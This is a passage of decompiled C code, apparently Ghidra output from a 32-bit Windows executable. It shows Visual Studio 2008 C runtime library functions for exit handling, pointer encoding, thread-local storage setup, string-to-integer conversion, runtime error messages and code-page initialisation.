        piVar2 = (int *)__decode_pointer(DAT_0041b3e4);
        local_2c = piVar1;
        local_24 = piVar2;
        local_20 = piVar1;
        while (piVar2 = piVar2 + -1, piVar1 <= piVar2) {
          iVar3 = __encoded_null();
          if (*piVar2 != iVar3) {
            if (piVar2 < piVar1) break;
            pcVar4 = (code *)__decode_pointer(*piVar2);
            iVar3 = __encoded_null();
            *piVar2 = iVar3;
            (*pcVar4)();
            piVar5 = (int *)__decode_pointer(DAT_0041b3e8);
            piVar6 = (int *)__decode_pointer(DAT_0041b3e4);
            if ((local_20 != piVar5) || (piVar1 = local_2c, local_24 != piVar6)) {
              piVar2 = piVar6;
              piVar1 = piVar5;
              local_2c = piVar5;
              local_24 = piVar6;
              local_20 = piVar5;
            }
          }
        }
      }
      __initterm((undefined **)&DAT_004141ac);
    }
    __initterm((undefined **)&DAT_004141b4);
  }
  FUN_0040b17a();
  if (param_3 == 0) {
    DAT_004196e4 = 1;
    FUN_0040a124(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



void FUN_0040b17a(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_0040a124(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2008 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



void FUN_0040b1ca(void)

{
  _doexit(0,1,1);
  return;
}



// Library Function - Single Match
//  __init_pointers
// 
// Library: Visual Studio 2008 Release

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = __encoded_null();
  FUN_0040b40b(uVar1);
  FUN_0040edc2(uVar1);
  FUN_00407e9b(uVar1);
  FUN_0040f703(uVar1);
  FUN_0040f6f4(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_0040ce14();
  __initp_eh_hooks();
  PTR___exit_004183f8 = (undefined *)__encode_pointer(0x40b1a5);
  return;
}



// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2008 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  char **ppcVar1;
  uint uVar2;
  int iVar3;
  errno_t eVar4;
  DWORD DVar5;
  size_t sVar6;
  char *_Dst;
  HANDLE hFile;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD local_c;
  uint local_8;
  
  local_8 = 0;
  do {
    if (param_1 == (&DAT_00418400)[local_8 * 2]) break;
    local_8 = local_8 + 1;
  } while (local_8 < 0x17);
  uVar2 = local_8;
  if (local_8 < 0x17) {
    iVar3 = __set_error_mode(3);
    if ((iVar3 != 1) && ((iVar3 = __set_error_mode(3), iVar3 != 0 || (DAT_004181ac != 1)))) {
      if (param_1 == 0xfc) {
        return;
      }
      eVar4 = _strcpy_s(&DAT_004196e8,0x314,"Runtime Error!\n\nProgram: ");
      if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      DAT_00419805 = 0;
      DVar5 = GetModuleFileNameA((HMODULE)0x0,&DAT_00419701,0x104);
      if ((DVar5 == 0) &&
         (eVar4 = _strcpy_s(&DAT_00419701,0x2fb,"<program name unknown>"), eVar4 != 0)) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      sVar6 = _strlen(&DAT_00419701);
      if (0x3c < sVar6 + 1) {
        sVar6 = _strlen(&DAT_00419701);
        _Dst = (char *)((int)&DAT_004196c4 + sVar6 + 2);
        eVar4 = _strncpy_s(_Dst,(int)&DAT_004199fc - (int)_Dst,"...",3);
        if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
          __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        }
      }
      eVar4 = _strcat_s(&DAT_004196e8,0x314,"\n\n");
      if (eVar4 == 0) {
        eVar4 = _strcat_s(&DAT_004196e8,0x314,*(char **)(local_8 * 8 + 0x418404));
        if (eVar4 == 0) {
          ___crtMessageBoxA(&DAT_004196e8,"Microsoft Visual C++ Runtime Library",0x12010);
          return;
        }
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    hFile = GetStdHandle(0xfffffff4);
    if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
      lpOverlapped = (LPOVERLAPPED)0x0;
      lpNumberOfBytesWritten = &local_c;
      ppcVar1 = (char **)(uVar2 * 8 + 0x418404);
      sVar6 = _strlen(*ppcVar1);
      WriteFile(hFile,*ppcVar1,sVar6,lpNumberOfBytesWritten,lpOverlapped);
    }
  }
  return;
}



// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2008 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_004181ac != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



void __cdecl FUN_0040b40b(undefined4 param_1)

{
  DAT_004199fc = param_1;
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2008 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)__decode_pointer(DAT_004199fc);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



// Library Function - Single Match
//  unsigned long __cdecl strtoxl(struct localeinfo_struct *,char const *,char const * *,int,int)
// 
// Library: Visual Studio 2008 Release

ulong __cdecl
strtoxl(localeinfo_struct *param_1,char *param_2,char **param_3,int param_4,int param_5)

{
  ushort uVar1;
  byte *pbVar2;
  int *piVar3;
  uint uVar4;
  pthreadlocinfo ptVar5;
  uint uVar6;
  int iVar7;
  byte bVar8;
  byte *pbVar9;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ulong local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,param_1);
  if (param_3 != (char **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (char *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  bVar8 = *param_2;
  local_8 = 0;
  ptVar5 = local_18.locinfo;
  pbVar2 = (byte *)param_2;
  while( true ) {
    pbVar9 = pbVar2 + 1;
    if ((int)ptVar5->locale_name[3] < 2) {
      uVar4 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2) & 8;
    }
    else {
      uVar4 = __isctype_l((uint)bVar8,8,&local_18);
      ptVar5 = local_18.locinfo;
    }
    if (uVar4 == 0) break;
    bVar8 = *pbVar9;
    pbVar2 = pbVar9;
  }
  if (bVar8 == 0x2d) {
    param_5 = param_5 | 2;
LAB_0040b4fb:
    bVar8 = *pbVar9;
    pbVar9 = pbVar2 + 2;
  }
  else if (bVar8 == 0x2b) goto LAB_0040b4fb;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (char **)0x0) {
      *param_3 = param_2;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    if (bVar8 != 0x30) {
      param_4 = 10;
      goto LAB_0040b561;
    }
    if ((*pbVar9 != 0x78) && (*pbVar9 != 0x58)) {
      param_4 = 8;
      goto LAB_0040b561;
    }
    param_4 = 0x10;
  }
  else if ((param_4 != 0x10) || (bVar8 != 0x30)) goto LAB_0040b561;
  if ((*pbVar9 == 0x78) || (*pbVar9 == 0x58)) {
    bVar8 = pbVar9[1];
    pbVar9 = pbVar9 + 2;
  }
LAB_0040b561:
  uVar4 = (uint)(0xffffffff / (ulonglong)(uint)param_4);
  do {
    uVar1 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2);
    if ((uVar1 & 4) == 0) {
      if ((uVar1 & 0x103) == 0) {
LAB_0040b5be:
        pbVar9 = pbVar9 + -1;
        if ((param_5 & 8U) == 0) {
          if (param_3 != (char **)0x0) {
            pbVar9 = (byte *)param_2;
          }
          local_8 = 0;
        }
        else if (((param_5 & 4U) != 0) ||
                (((param_5 & 1U) == 0 &&
                 ((((param_5 & 2U) != 0 && (0x80000000 < local_8)) ||
                  (((param_5 & 2U) == 0 && (0x7fffffff < local_8)))))))) {
          piVar3 = __errno();
          *piVar3 = 0x22;
          if ((param_5 & 1U) == 0) {
            local_8 = ((param_5 & 2U) != 0) + 0x7fffffff;
          }
          else {
            local_8 = 0xffffffff;
          }
        }
        if (param_3 != (char **)0x0) {
          *param_3 = (char *)pbVar9;
        }
        if ((param_5 & 2U) != 0) {
          local_8 = -local_8;
        }
        if (local_c == '\0') {
          return local_8;
        }
        *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
        return local_8;
      }
      iVar7 = (int)(char)bVar8;
      if ((byte)(bVar8 + 0x9f) < 0x1a) {
        iVar7 = iVar7 + -0x20;
      }
      uVar6 = iVar7 - 0x37;
    }
    else {
      uVar6 = (int)(char)bVar8 - 0x30;
    }
    if ((uint)param_4 <= uVar6) goto LAB_0040b5be;
    if ((local_8 < uVar4) ||
       ((local_8 == uVar4 && (uVar6 <= (uint)(0xffffffff % (ulonglong)(uint)param_4))))) {
      local_8 = local_8 * param_4 + uVar6;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (char **)0x0) goto LAB_0040b5be;
    }
    bVar8 = *pbVar9;
    pbVar9 = pbVar9 + 1;
  } while( true );
}



// Library Function - Single Match
//  _strtol
// 
// Library: Visual Studio 2008 Release

long __cdecl _strtol(char *_Str,char **_EndPtr,int _Radix)

{
  ulong uVar1;
  undefined **ppuVar2;
  
  if (DAT_00419a30 == 0) {
    ppuVar2 = &PTR_DAT_00418ad0;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  uVar1 = strtoxl((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return uVar1;
}



// Library Function - Single Match
//  __encode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __encode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_004184bc);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_004184b8 != -1)) {
    iVar3 = DAT_004184b8;
    pcVar2 = (code *)TlsGetValue(DAT_004184bc);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1f8);
      goto LAB_0040b6fc;
    }
  }
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL"), hModule == (HMODULE)0x0))
  {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,"EncodePointer");
LAB_0040b6fc:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  __encoded_null
// 
// Library: Visual Studio 2008 Release

void __encoded_null(void)

{
  __encode_pointer(0);
  return;
}



// Library Function - Single Match
//  __decode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __decode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_004184bc);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_004184b8 != -1)) {
    iVar3 = DAT_004184b8;
    pcVar2 = (code *)TlsGetValue(DAT_004184bc);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1fc);
      goto LAB_0040b777;
    }
  }
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL"), hModule == (HMODULE)0x0))
  {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,"DecodePointer");
LAB_0040b777:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  ___set_flsgetvalue
// 
// Library: Visual Studio 2008 Release

LPVOID ___set_flsgetvalue(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(DAT_004184bc);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = (LPVOID)__decode_pointer(DAT_00419a08);
    TlsSetValue(DAT_004184bc,lpTlsValue);
  }
  return lpTlsValue;
}



// Library Function - Single Match
//  __mtterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __mtterm(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_004184b8 != -1) {
    iVar2 = DAT_004184b8;
    pcVar1 = (code *)__decode_pointer(DAT_00419a10);
    (*pcVar1)(iVar2);
    DAT_004184b8 = -1;
  }
  if (DAT_004184bc != 0xffffffff) {
    TlsFree(DAT_004184bc);
    DAT_004184bc = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __initptd
// 
// Library: Visual Studio 2008 Release

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL");
  }
  _Ptd->_pxcptacttab = &DAT_004149b0;
  _Ptd->_holdrand = 1;
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"EncodePointer");
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1d) = pFVar1;
    pFVar1 = GetProcAddress(hModule,"DecodePointer");
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1f) = pFVar1;
  }
  _Ptd->_ownlocale = 1;
  *(undefined *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_004184c0;
  __lock(0xd);
  InterlockedIncrement(&_Ptd->ptmbcinfo->refcount);
  FUN_0040b8d8();
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = (pthreadlocinfo)PTR_DAT_00418ac8;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_0040b8e1();
  return;
}



void FUN_0040b8d8(void)

{
  FUN_0040a124(0xd);
  return;
}



void FUN_0040b8e1(void)

{
  FUN_0040a124(0xc);
  return;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  uVar4 = DAT_004184b8;
  pcVar1 = (code *)___set_flsgetvalue();
  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_004184b8;
      p_Var5 = _Ptd;
      pcVar1 = (code *)__decode_pointer(DAT_00419a0c);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



void FUN_0040ba97(void)

{
  FUN_0040a124(0xd);
  return;
}



void FUN_0040baa3(void)

{
  FUN_0040a124(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  undefined *puVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL");
  }
  if (hModule != (HMODULE)0x0) {
    DAT_00419a04 = GetProcAddress(hModule,"FlsAlloc");
    DAT_00419a08 = GetProcAddress(hModule,"FlsGetValue");
    DAT_00419a0c = GetProcAddress(hModule,"FlsSetValue");
    DAT_00419a10 = GetProcAddress(hModule,"FlsFree");
    if ((((DAT_00419a04 == (FARPROC)0x0) || (DAT_00419a08 == (FARPROC)0x0)) ||
        (DAT_00419a0c == (FARPROC)0x0)) || (DAT_00419a10 == (FARPROC)0x0)) {
      DAT_00419a08 = TlsGetValue_exref;
      DAT_00419a04 = (FARPROC)&LAB_0040b789;
      DAT_00419a0c = TlsSetValue_exref;
      DAT_00419a10 = TlsFree_exref;
    }
    DAT_004184bc = TlsAlloc();
    if (DAT_004184bc == 0xffffffff) {
      return 0;
    }
    BVar1 = TlsSetValue(DAT_004184bc,DAT_00419a08);
    if (BVar1 == 0) {
      return 0;
    }
    __init_pointers();
    DAT_00419a04 = (FARPROC)__encode_pointer((int)DAT_00419a04);
    DAT_00419a08 = (FARPROC)__encode_pointer((int)DAT_00419a08);
    DAT_00419a0c = (FARPROC)__encode_pointer((int)DAT_00419a0c);
    DAT_00419a10 = (FARPROC)__encode_pointer((int)DAT_00419a10);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      puVar5 = &LAB_0040b97d;
      pcVar3 = (code *)__decode_pointer((int)DAT_00419a04);
      DAT_004184b8 = (*pcVar3)(puVar5);
      if ((DAT_004184b8 != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_004184b8;
        p_Var6 = _Ptd;
        pcVar3 = (code *)__decode_pointer((int)DAT_00419a0c);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
  }
  __mtterm();
  return 0;
}



// Library Function - Single Match
//  int __cdecl CPtoLCID(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  _memset((void *)(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_004184c0 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_004184c0 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
  uint uVar4;
  CHAR CVar5;
  char cVar6;
  BYTE *pBVar7;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [256];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_0040be45:
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_0040be45;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pBVar7 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar7) {
          _memset(local_108 + uVar4,0x20,(*pBVar7 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar7[1];
        pBVar7 = pBVar7 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          CVar5 = local_308[uVar4];
          goto LAB_0040bde3;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        CVar5 = local_208[uVar4];
LAB_0040bde3:
        *(CHAR *)(unaff_ESI + 0x11d + uVar4) = CVar5;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2008 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_004189e4) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)PTR_DAT_004188e8) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_004184c0)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_004188e8;
      lpAddend = (pthreadmbcinfo)PTR_DAT_004188e8;
      InterlockedIncrement((LONG *)PTR_DAT_004188e8);
    }
    FUN_0040befa();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_0040befa(void)

{
  FUN_0040a124(0xd);
  return;
}



// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  int unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_00419a14 = 0;
  if (unaff_ESI == -2) {
    DAT_00419a14 = 1;
    UVar1 = GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_00419a14 = 1;
    UVar1 = GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_00419a14 = 0;
        return unaff_ESI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_ESI;
    }
    UVar1 = *(UINT *)(local_14[0] + 4);
    DAT_00419a14 = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2008 Release

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  BOOL BVar6;
  undefined2 *puVar7;
  byte *pbVar8;
  int extraout_ECX;
  undefined2 *puVar9;
  int iVar10;
  undefined4 extraout_EDX;
  BYTE *pBVar11;
  threadmbcinfostruct *unaff_EDI;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  uVar4 = getSystemCP((int)unaff_EDI);
  if (uVar4 != 0) {
    local_20 = (byte *)0x0;
    uVar5 = 0;
LAB_0040bfbd:
    if (*(uint *)((int)&DAT_004188f0 + uVar5) != uVar4) goto code_r0x0040bfc9;
    _memset((void *)(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar8 = &DAT_00418900 + (int)local_20 * 0x30;
    local_20 = pbVar8;
    do {
      for (; (*pbVar8 != 0 && (bVar3 = pbVar8[1], bVar3 != 0)); pbVar8 = pbVar8 + 2) {
        for (uVar5 = (uint)*pbVar8; uVar5 <= bVar3; uVar5 = uVar5 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar5);
          *pbVar2 = *pbVar2 | (&DAT_004188ec)[local_24];
          bVar3 = pbVar8[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar8 = local_20 + 8;
      local_20 = pbVar8;
    } while (local_24 < 4);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar10 = CPtoLCID((int)unaff_EDI);
    *(int *)(param_2 + 0xc) = iVar10;
    puVar7 = (undefined2 *)(param_2 + 0x10);
    puVar9 = (undefined2 *)(&DAT_004188f4 + extraout_ECX);
    iVar10 = 6;
    do {
      *puVar7 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar7 = puVar7 + 1;
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    goto LAB_0040c0ee;
  }
LAB_0040bfaa:
  setSBCS(unaff_EDI);
LAB_0040c155:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x0040bfc9:
  local_20 = (byte *)((int)local_20 + 1);
